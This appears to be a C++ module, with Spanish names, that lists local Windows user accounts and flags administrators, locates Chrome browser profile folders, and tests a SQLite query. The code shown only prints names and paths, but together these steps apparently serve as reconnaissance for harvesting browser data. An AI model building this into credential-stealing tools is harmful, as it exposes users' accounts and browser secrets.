#include "mod_info.hpp"
#include "misc.hpp"

static int callback(void* NotUsed, int argc, char** argv, char** azColName)
{
	int i;
	for (i = 0; i < argc; i++)
	{
		printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
	}
	printf("\n");
	return 0;
}

void mod_Info::test_Data() {
	std::cout << "USUARIOS:\n";
	for (std::string user : this->m_Usuarios()) {
		std::cout << user << "\n";
	}
	std::cout << "SQLITE3 TEST:\n";
	this->test_SQL();

	std::cout << "CHROME PROFILES:\n";
	for (std::string path : this->m_ChromeProfiles()) {
		std::cout << path << "\n";
	}
}

void mod_Info::test_SQL(){
	sqlite3* db;
	char* zErrMsg = 0;
	
	int iRet = sqlite3_open("archivo.sqlite", &db);

	if (iRet != SQLITE_OK) {
		std::cout << "No se pudo abrir el archivo\n";
		sqlite3_close(db);
		return;
	}

	const char* cQuery = "SELECT * FROM usuarios;";
	iRet = sqlite3_exec(db, cQuery, callback, 0, &zErrMsg);

	if (iRet != SQLITE_OK) {
		std::cout << "SQL error: " << zErrMsg << "\n";
		sqlite3_free(zErrMsg);
	}

	sqlite3_close(db);

}

std::vector<std::string> mod_Info::m_ChromeProfiles() {
	int iBuffSize = 4096;
	LPSTR env_var = (LPSTR)malloc(iBuffSize);
	std::vector<std::string> vcOut;
	if (env_var == NULL) {
		__DBG_("No se pudo reservar memoria");
		return vcOut;
	}
	DWORD dwRet = GetEnvironmentVariable("APPDATA", env_var, iBuffSize);
	
	if (dwRet == 0) {
		_DBG_("Error", GetLastError());
		return vcOut;
	}
	
	std::string strPath = env_var;
	
	free(env_var);
	env_var = NULL;

	std::vector<std::string> vcTemp = strSplit(strPath, '\\', 1024);
	vcTemp.pop_back();
	
	strPath = "";
	for (std::string sub_path : vcTemp) {
		strPath += sub_path + "\\";
	}
	strPath += "Local\\Google\\Chrome\\User Data\\";
	
	vcOut.push_back(strPath + "Default\\");

	WIN32_FIND_DATA win32Archivo;
	struct stat info;

	TCHAR szDir[MAX_PATH];
	HANDLE hFind = INVALID_HANDLE_VALUE;
	snprintf(szDir, MAX_PATH, "%sProfile*", strPath.c_str());
	hFind = FindFirstFileA(szDir, &win32Archivo);
	
	if (!hFind) {
		__DBG_("FindFirstFile error");
		return vcOut;
	}

	do {
		std::string strTemp = strPath;
		strTemp += win32Archivo.cFileName;
		vcOut.push_back(strTemp);
	} while (FindNextFile(hFind, &win32Archivo) != 0);

	if (hFind) { FindClose(hFind); }

	return vcOut;
}

std::vector<std::string> mod_Info::m_Usuarios() {
	std::vector<std::string> vcOut;
	LPUSER_INFO_11 lUsers = nullptr;
	LPUSER_INFO_11 lTmpuser = nullptr;
	DWORD dCount = 0, dHints = 0;
	NET_API_STATUS nStatus;
	do {
		nStatus = NetUserEnum(nullptr, 11, 0, (LPBYTE*)&lUsers, MAX_PREFERRED_LENGTH, &dCount, &dHints, 0);
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
			if ((lTmpuser = lUsers) != nullptr) {
				for (DWORD i = 0; (i < dCount); i++) {
					if (lUsers == NULL) {
						__DBG_("lUsers = NULL")
						break;
					}
					std::wstring st = lTmpuser->usri11_name;
					std::string strTempUser(st.begin(), st.end());
					if (strTempUser != "") {
						if (lTmpuser->usri11_priv == USER_PRIV_ADMIN) {
							strTempUser += " (ADMIN)";
						}
						vcOut.push_back(strTempUser);
					}
					lTmpuser++;
				}
			}
		}
		if (lUsers != nullptr) {
			NetApiBufferFree(lUsers);
			lUsers = nullptr;
		}
	} while (nStatus == ERROR_MORE_DATA);
	if (lUsers != nullptr) {
		NetApiBufferFree(lUsers);
		lUsers = nullptr;
	}
	return vcOut;
}